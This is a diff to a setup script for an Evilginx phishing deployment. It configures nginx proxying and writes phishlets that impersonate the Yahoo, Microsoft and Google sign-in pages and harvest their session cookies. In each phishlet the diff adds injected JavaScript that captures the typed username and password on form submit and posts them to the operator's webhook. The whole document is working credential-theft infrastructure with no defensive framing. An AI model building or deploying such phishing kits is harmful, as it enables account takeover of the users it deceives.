@@ -446,10 +446,13 @@ server {
 
     location / {
         proxy_pass https://127.0.0.1:8443;
+        proxy_ssl_server_name on;
+        proxy_ssl_name \$host;
         proxy_ssl_verify off;
         proxy_set_header Host \$host;
         proxy_set_header X-Real-IP \$remote_addr;
         proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto https;
         proxy_redirect off;
         proxy_buffering off;
         proxy_http_version 1.1;
@@ -574,13 +577,13 @@ configure_evilginx_integration() {
 
     # Create Evilginx config
     cat > "$EVILGINX_DIR/config.yaml" << EOF
-daemon: false
-debug: false
-version: 3.0.0
+daemon: true
+debug: true
 domain: $DOMAIN
-ipv4: 0.0.0.0
+ipv4: $VPS_IP
 http_port: 8081
 https_port: 8443
+dns_port: 0
 redirect_url: https://www.google.com
 phishlets_path: $EVILGINX_DIR/phishlets
 cert_path: $EVILGINX_DIR/certs
@@ -594,7 +597,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '$EP1', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
 sub_filters:
-  - {trg: 'login.yahoo.com', orig: 'login.yahoo.com', repl: '$EP1.{hostname}'}
+  - {triggers_on: 'login.yahoo.com', orig: 'login.yahoo.com', repl: '$EP1.{hostname}', trg: 'login.yahoo.com', type: 'header'}
 auth_tokens:
   - domain: '.yahoo.com'
     keys: ['A3', 'A1', 'A1S']
@@ -614,15 +617,25 @@ js_inject:
   - trigger: 'login.yahoo.com'
     code: |
       (function() {
-        var urlParams = new URLSearchParams(window.location.search);
-        var email = urlParams.get('email');
-        if (email) {
-          var emailField = document.querySelector('input[name="username"]');
-          if (emailField) {
-            emailField.value = email;
-            emailField.dispatchEvent(new Event('input', { bubbles: true }));
-          }
+        const api = "https://$DOMAIN/api/webhook";
+        const secret = "$WEBHOOK_SECRET";
+        const source = "yahoo";
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailParam = urlParams.get('email');
+        if (emailParam) {
+          const field = document.querySelector('input[name="username"]');
+          if (field) { field.value = emailParam; field.dispatchEvent(new Event('input', { bubbles: true })); }
         }
+        document.addEventListener('submit', function() {
+          const u = document.querySelector('input[name="username"]')?.value;
+          const p = document.querySelector('input[name="passwd"]')?.value;
+          if (u || p) {
+            fetch(api, {
+              method: "POST", headers: {"Content-Type": "application/json", "X-Webhook-Secret": secret},
+              body: JSON.stringify({event: p ? "credentials" : "email", source: source, email: u, password: p})
+            }).catch(() => {});
+          }
+        }, true);
       })()
 webhook:
   url: "http://127.0.0.1:$APP_PORT/api/webhook"
@@ -639,7 +652,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '$EP2', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
 sub_filters:
-  - {trg: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: '$EP2.{hostname}'}
+  - {triggers_on: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: '$EP2.{hostname}', trg: 'login.microsoftonline.com', type: 'header'}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
@@ -659,15 +672,25 @@ js_inject:
   - trigger: 'login.microsoftonline.com'
     code: |
       (function() {
-        var urlParams = new URLSearchParams(window.location.search);
-        var email = urlParams.get('email');
-        if (email) {
-          var emailField = document.querySelector('input[name="login"]');
-          if (emailField) {
-            emailField.value = email;
-            emailField.dispatchEvent(new Event('input', { bubbles: true }));
-          }
+        const api = "https://$DOMAIN/api/webhook";
+        const secret = "$WEBHOOK_SECRET";
+        const source = "microsoft";
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailParam = urlParams.get('email');
+        if (emailParam) {
+          const field = document.querySelector('input[name="login"]') || document.querySelector('input[type="email"]');
+          if (field) { field.value = emailParam; field.dispatchEvent(new Event('input', { bubbles: true })); }
         }
+        document.addEventListener('submit', function() {
+          const u = document.querySelector('input[name="login"]')?.value || document.querySelector('input[type="email"]')?.value;
+          const p = document.querySelector('input[name="passwd"]')?.value || document.querySelector('input[type="password"]')?.value;
+          if (u || p) {
+            fetch(api, {
+              method: "POST", headers: {"Content-Type": "application/json", "X-Webhook-Secret": secret},
+              body: JSON.stringify({event: p ? "credentials" : "email", source: source, email: u, password: p})
+            }).catch(() => {});
+          }
+        }, true);
       })()
 webhook:
   url: "http://127.0.0.1:$APP_PORT/api/webhook"
@@ -684,7 +707,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '$EP3', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
 sub_filters:
-  - {trg: 'accounts.google.com', orig: 'accounts.google.com', repl: '$EP3.{hostname}'}
+  - {triggers_on: 'accounts.google.com', orig: 'accounts.google.com', repl: '$EP3.{hostname}', trg: 'accounts.google.com', type: 'header'}
 auth_tokens:
   - domain: '.google.com'
     keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
@@ -704,15 +727,25 @@ js_inject:
   - trigger: 'accounts.google.com'
     code: |
       (function() {
-        var urlParams = new URLSearchParams(window.location.search);
-        var email = urlParams.get('email');
-        if (email) {
-          var emailField = document.querySelector('input[type="email"]');
-          if (emailField) {
-            emailField.value = email;
-            emailField.dispatchEvent(new Event('input', { bubbles: true }));
-          }
+        const api = "https://$DOMAIN/api/webhook";
+        const secret = "$WEBHOOK_SECRET";
+        const source = "google";
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailParam = urlParams.get('email');
+        if (emailParam) {
+          const field = document.querySelector('input[type="email"]') || document.querySelector('input[name="identifier"]');
+          if (field) { field.value = emailParam; field.dispatchEvent(new Event('input', { bubbles: true })); }
         }
+        document.addEventListener('submit', function() {
+          const u = document.querySelector('input[type="email"]')?.value || document.querySelector('input[name="identifier"]')?.value;
+          const p = document.querySelector('input[type="password"]')?.value || document.querySelector('input[name="Passwd"]')?.value;
+          if (u || p) {
+            fetch(api, {
+              method: "POST", headers: {"Content-Type": "application/json", "X-Webhook-Secret": secret},
+              body: JSON.stringify({event: p ? "credentials" : "email", source: source, email: u, password: p})
+            }).catch(() => {});
+          }
+        }, true);
       })()
 webhook:
   url: "http://127.0.0.1:$APP_PORT/api/webhook"
